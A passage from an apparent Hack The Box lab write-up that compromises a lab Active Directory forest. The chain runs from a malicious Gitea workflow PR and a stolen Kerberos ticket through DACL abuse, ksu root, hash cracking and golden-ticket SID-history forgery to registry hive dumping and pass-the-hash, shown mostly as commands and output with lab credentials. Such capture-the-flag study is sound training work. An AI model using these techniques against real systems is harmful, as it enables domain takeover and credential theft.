curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"content":"$CONTENT_B64", "message": "pwn", "branch": "$BRANCH_NAME"}"   "$GITEA_URL/api/v1/repos/$MY_FORK/contents/.gitea%2Fworkflows%2Fpwn.yml" > /dev/null

PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"title":"pwn", "body": "pwn", "head": "$FORK_USER:$BRANCH_NAME", "base": "main"}"   "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls")

PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')

curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"event":"COMMENT", "body": "pwn", "commit_id": "$HEAD_SHA"}"   "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls/$PR_NUM/reviews" > /dev/null

sleep 15
chmod 600 ./htb_key2
ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
```

---

### Active Directory Enumeration (Domain Users & Kerberoasting)

Checking the runner environment and temporary directory:

```bash
svc-runner@SRV01:/tmp$ ls -la /opt/gitea*
```

```text
total 20488
drwxr-x--- 4 svc-runner root             4096 May 20 23:36 .
drwxr-xr-x 6 root       root             4096 Jul 21 05:39 ..
-rwxr-x--- 1 svc-runner root         20951202 Feb 18  2026 act_runner
drwxr-x--- 4 svc-runner root             4096 May 20 23:33 .cache
-rwxr-x--- 1 svc-runner root              140 May 20 23:33 config.yaml
drwxr-xr-x 4 svc-runner domain users     4096 May 20 23:36 .npm
-rwxr-x--- 1 svc-runner root              460 May 20 23:33 .runner
```

Checking `/tmp` reveals a valid Kerberos ccache ticket: `krb5cc_gitea`:

```bash
svc-runner@SRV01:/tmp$ export KRB5CCNAME=krb5cc_gitea
svc-runner@SRV01:/tmp$ klist
```

```text
Ticket cache: FILE:krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 20:05:05  08/28/2026 06:05:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 20:05:05
```

We transfer this ticket to our attack host:
1. `base64 -w0 /tmp/krb5cc_gitea`
2. On attack machine: `echo '<B64>' | base64 -d > svc-runner.ccache && chmod 600 svc-runner.ccache`
3. `export KRB5CCNAME=$(pwd)/svc-runner.ccache`

Synchronize time with the target to prevent Kerberos clock skew (`KRB_AP_ERR_SKEW`):

```bash
sudo date -s "$(sshpass -p 'Rangers1' ssh -o StrictHostKeyChecking=no josh@dzcampaigns.htb date)"
```

List all domain users with Impacket:

```bash
impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[*] Querying DC02 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2026-05-18 12:41:22  2026-07-23 20:35:01 
Guest                                                 <never>              <never>             
krbtgt                                                2026-04-06 14:16:41  <never>             
david                                                 2026-05-18 12:57:32  <never>             
william                                               2026-05-18 12:57:32  <never>             
celia                                                 2026-07-14 13:59:09  <never>             
josh                                                  2026-05-20 22:38:58  2026-08-27 22:15:25 
svc-gitea                                             2026-05-20 22:50:00  2026-08-27 20:04:38 
svc-runner                                            2026-05-20 22:50:01  2026-08-27 20:05:05 
```

Checking for Kerberoastable SPNs:

```bash
impacket-GetUserSPNs -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner
```

```text
ServicePrincipalName          Name       MemberOf                                       PasswordLastSet             LastLogon
----------------------------  ---------  ---------------------------------------------  --------------------------  --------------------------
HTTP/gitea.darkzero.ext:3000  svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185
HTTP/gitea.darkzero.ext       svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185
```

---

### LDAP Organizational Unit Enumeration via ldapsearch

We query Active Directory Organizational Units using `ldapsearch` over GSSAPI:

```bash
ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext -b "DC=darkzero,DC=ext" "(objectClass=organizationalUnit)" ou
```

```text
SASL/GSSAPI authentication started
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <DC=darkzero,DC=ext> with scope subtree
# filter: (objectClass=organizationalUnit)
# requesting: ou 
#

# Domain Controllers, darkzero.ext
dn: OU=Domain Controllers,DC=darkzero,DC=ext
ou: Domain Controllers

# GiteaMigration, darkzero.ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
ou: GiteaMigration

# search reference
ref: ldap://ForestDnsZones.darkzero.ext/DC=ForestDnsZones,DC=darkzero,DC=ext
ref: ldap://DomainDnsZones.darkzero.ext/DC=DomainDnsZones,DC=darkzero,DC=ext
ref: ldap://darkzero.ext/CN=Configuration,DC=darkzero,DC=ext

# search result
search: 4
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3
```

---

### Active Directory DACL Abuse & Child Creation in OU=GiteaMigration

We check writable DACL permissions using `bloodyAD`:

```bash
bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext get writable
```

```text
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=darkzero,DC=ext
permission: CREATE_CHILD
```

- 🔍 *`svc-runner` possesses `CREATE_CHILD` permissions on `OU=GiteaMigration,DC=darkzero,DC=ext`!*

We abuse this DACL privilege to create a new domain user named `root`:

```bash
bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext --dc-ip 172.16.20.2   add user root 'RootPass123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'
```

```text
[+] root created
```

Verify user creation with Impacket:

```bash
impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
```

```text
root                                                  2026-08-29 22:12:32  <never>
```

---

### Local Privilege Escalation via Kerberos Substitute User (ksu root)

> [!NOTE]
> **What is ksu?** The `ksu` (Kerberos Substitute User) utility is a Kerberized implementation of `su`. It changes a user's real and effective UID to root by verifying Kerberos tickets instead of local `/etc/shadow` passwords.

```text
[ Linux User ] ──(1. kinit / Get TGT)──> [ Active Directory (KDC) ]
      │                                             │
(2. ksu root)                                       │
      │                                             │
      ├──(3. Request host/ Service Ticket)─────────►│
      │◄─(4. Issue Service Ticket)──────────────────┘
      │
(5. Check .k5login / .k5users)
      │
[ Granted Root Shell ]
```

1. Request a TGT for the newly created domain user `root@DARKZERO.EXT`:

```bash
svc-runner@SRV01:/tmp$ echo "RootPass123!" | kinit root@DARKZERO.EXT
svc-runner@SRV01:/tmp$ klist
```

```text
Ticket cache: KEYRING:persistent:780601113:780601113
Default principal: root@DARKZERO.EXT

Valid starting       Expires              Service principal
08/29/2026 22:36:47  08/30/2026 08:36:47  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/05/2026 22:36:38
```

2. Execute `ksu root` to obtain a root shell:

```bash
svc-runner@SRV01:/tmp$ ksu root
```

```text
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root

root@SRV01:/tmp# whoami
root
root@SRV01:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Boom! We have full root privileges on SRV01!

---

### Root Filesystem Inspection & Database Backup Extraction

Inspecting `/root` reveals a database backup:

```bash
root@SRV01:~# ls
darkzero_campaigns_backup.sql
```

Extracting user records from the SQL backup:

```sql
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

Crack Celia's bcrypt hash with Hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC:babygurl13 --> celia
```

---

### Celia Hash Cracking & BloodHound Collection

With Celia's domain credentials, we run BloodHound collection:

```bash
bloodhound-python -d darkzero.ext -u celia -p 'babygurl13' -no-pass   -dc dc02.darkzero.ext -ns 172.16.20.2 -c All --zip --disable-autogc
```

```text
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.ext
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc02.darkzero.ext
INFO: Found 1 domains, 2 computers, 11 users, 59 groups, 1 trusts.
INFO: Compressing output into 20260829224845_bloodhound.zip
```

![web-img](images/DarkZeroReturns/d19.png)

Analyzing Celia's permissions:
- `CELIA` is a member of **DOMAIN ADMINS**, **DOMAIN USERS**, and **GITEAADMINS**.
- Celia effectively holds `GenericAll` over `darkzero.ext`.
- Because `darkzero.ext` is already compromised, our goal is crossing the trust boundary into the root domain: **`darkzero.htb`**.

---

### Cross-Domain Trust Exploitation via Forged Referral Tickets (Forest Root Escalation)

> [!NOTE]
> **Cross-Domain Trust Exploitation:**
> Allows an attacker with administrative control over a child domain (`darkzero.ext`) to cross security boundaries and compromise the parent forest root (`darkzero.htb`) via forged Kerberos referral tickets with injected **SID History**.

```text
[ Linux Attacker ]             [ DC02 (DARKZERO.EXT) ]      [ DC01 (DARKZERO.HTB) ]
       │                                  │                            │
       │───(1) Forged TGT with PAC ────►│                            │
       │       (Injected SID History)     │                            │
       │                                  │                            │
       │◄──(2) Issue Referral TGS ─────│                            │
       │       (Encrypted with Trust Key) │                            │
       │                                  │                            │
       │───(3) Present Referral TGS ────┼────────────────────►        │
       │                                  │                            │
       │                                  │                   (4) Decrypts with Trust Key,
       │                                  │                       Validates PAC,
       │                                  │                       Honors SID History
       │                                  │                            │
       │◄──(5) Issue Final Service Ticket┼─────────────────────│
```

Active Directory Parent-Child Trust Architecture:

```text
    ┌──────────────────────────────┐
    │     DARKZERO.HTB (Root)      │
    │         [ Parent ]           │
    └──────────────┬───────────────┘
                   ▲
                   │  ▲ 2-Way
                   │  │ Transitive
                   ▼  │ Trust
    ┌──────────────┴───────────────┐
    │     DARKZERO.EXT (Child)     │
    │         [ Trusted ]          │
    └──────────────────────────────┘
```

Configure `/etc/krb5.conf` with both realms:

```ini
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    DARKZERO.EXT = {
        kdc = 172.16.20.2
        admin_server = 172.16.20.2
    }
    DARKZERO.HTB = {
        kdc = 172.16.20.1
        admin_server = 172.16.20.1
    }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
```

---

### Step 1: Forging the Golden TGT with Injected SID History

Using Celia's administrative privileges and the `krbtgt` AES-256 key from `darkzero.ext`, we forge a Golden Ticket injecting the target domain's privileged group SID (`S-1-5-21-2899195410-1848524783-1547768515-1603`) into the **Extra-SID (SID History)** attribute:

```bash
impacket-ticketer   -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6   -domain-sid S-1-5-21-2850783758-1231244658-2051857529   -domain darkzero.ext   -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603   -groups 513 -user-id 1109   celia
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/celia
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in celia.ccache
```

#### 🎫 Forged Ticket Configuration Breakdown

| Flag / Parameter | Value | Role / Purpose |
| :--- | :--- | :--- |
| **`-aesKey`** | `krbtgt` AES-256 key *(from DCSync)* | **The Signature:** Validates the ticket, forcing `DC02` to accept the forged TGT. |
| **`-domain` / `-domain-sid`** | `darkzero.ext` / `S-1-5-21-2850...` | **The Realm:** Defines the domain and SID namespace where the ticket originates. |
| **`-user-id`** | `1109` *(Celia's RID)* | **The Identity:** Builds the user's primary security identifier (Domain SID + 1109). |
| **`-groups`** | `513` *(Domain Users)* | **The Baseline:** Grants standard group membership so the token looks ordinary. |
| **`-extra-sid`** | `S-1-5-21-...-1603` *(HTB privileged group)* | **The Privilege Escalation:** Injects the target domain's admin SID into the **SID History** that `DC01` will honor. |
| **`celia`** *(Positional)* | Username | **The Cosmetic Label:** Sets the visual username displayed inside the ticket logs. |

Export and verify the forged ticket in the cache:

```bash
export KRB5CCNAME=$(pwd)/celia.ccache
klist
```

```text
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41
```

---

### Step 2: Requesting Cross-Realm Referral Ticket (TGS)

Present the forged TGT to DC02 to obtain an inter-domain referral ticket for `cifs/dc01.darkzero.htb`:

```bash
kvno cifs/dc01.darkzero.htb
klist
```

```text
cifs/dc01.darkzero.htb@DARKZERO.EXT: kvno = 4
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41
09/10/2026 22:21:56  09/11/2026 08:21:55  cifs/dc01.darkzero.htb@DARKZERO.EXT
        renew until 09/17/2026 22:21:55
        Ticket server: cifs/dc01.darkzero.htb@DARKZERO.HTB
```

---

### Step 3: Exploiting Backup Operators via RemoteRegistry (Hive Heist)

Verify access against the root domain controller with NetExec:

```bash
netexec smb 172.16.20.1 -k --use-kcache
```

```text
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 
```

The injected SID `...-1603` confers **Backup Operators** (`SeBackupPrivilege`). We invoke the `backup_operator` module to dump the SAM, SYSTEM, and SECURITY registry hives through RemoteRegistry:

```bash
netexec smb 172.16.20.1 -k --use-kcache -M backup_operator
```

```text
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 
BACKUP_O... 172.16.20.1     445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SAM to \\172.16.20.1\SYSVOL\SAM
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SYSTEM to \\172.16.20.1\SYSVOL\SYSTEM                                               
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SECURITY to \\172.16.20.1\SYSVOL\SECURITY                                           
SMB         172.16.20.1     445    DC01             [*] Copying "SAM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [+] File "SAM" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [*] Copying "SECURITY" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [+] File "SECURITY" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [*] Copying "SYSTEM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SYSTEM"
```

---

### Step 4: Extracting Domain Controller Hashes & Forest Root Compromise

Extract the local SAM and LSA secrets from the downloaded hives with Impacket:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

```text
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DARKZERO\DC01$:aes256-cts-hmac-sha1-96:25e878d205e933e9e4990104899a59479088201782134522f8ae10e0eda42da1
DARKZERO\DC01$:aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
dpapi_userkey:0x33aef7188b336e1e7e32e49e6a02707b99214d31
[*] Cleaning up...
```

We obtain the NT hash for the root domain Administrator:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
```

Execute Pass-the-Hash against DC01 (`172.16.20.1`) with `impacket-wmiexec`:

```bash
impacket-wmiexec -hashes :4d470bb7497acf3f5f5c2a11872e02ac Administrator@172.16.20.1
```

```text
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
darkzero\administrator
```

```text
Target down!
Domain Compromised!
```

---

- 🔍 *To be very honest, this was the fabulous machine of this season. Even though it wears a mask of the difficulty level "Hard" while being an insane one under the hood, the exploitation was pretty much fun and enjoyable. I tried to cover all the difficult theories and practical parts of the machine, with some new learnings and understandings. Hope you liked it. Happy hacking!*
